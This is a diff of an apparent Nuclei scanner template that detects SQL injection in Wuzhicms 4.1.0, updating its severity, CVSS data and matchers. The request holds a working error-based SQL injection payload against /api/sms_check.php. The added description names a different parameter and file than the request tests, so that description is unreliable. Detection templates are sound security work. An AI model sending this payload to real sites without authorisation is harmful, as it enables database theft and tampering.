@@ -1,25 +1,36 @@
 id: wuzhicms-sqli
 
 info:
-  name: Wuzhicms v4.1.0 SQL Injection
+  name: Wuzhicms 4.1.0 - SQL Injection
   author: princechaddha
-  severity: high
+  severity: critical
+  description: Wuzhicms 4.1.0 contains a SQL injection vulnerability via the grouppid parameter of /coreframe/app/member/admin/group.php. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
   reference:
     - https://github.com/wuzhicms/wuzhicms/issues/184
+    - https://vulners.com/cnvd/CNVD-2022-36985
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-89
   tags: wuzhicms,sqli
+
+variables:
+  num: "999999999"
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20"
+      - "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5({{num}})),0x7e),1)--%20"
+
     matchers-condition: and
     matchers:
+      - type: word
+        words:
+          - '{{md5({{num}})}}'
+        part: body
+
       - type: status
         status:
           - 200
-      - type: word
-        words:
-          - "81dc9bdb52d04dc20036dbd8313ed05"
-          - "sql_error:MySQL Query Error"
-        part: body
-        condition: and
+
+# Enhanced by mp on 2022/09/28
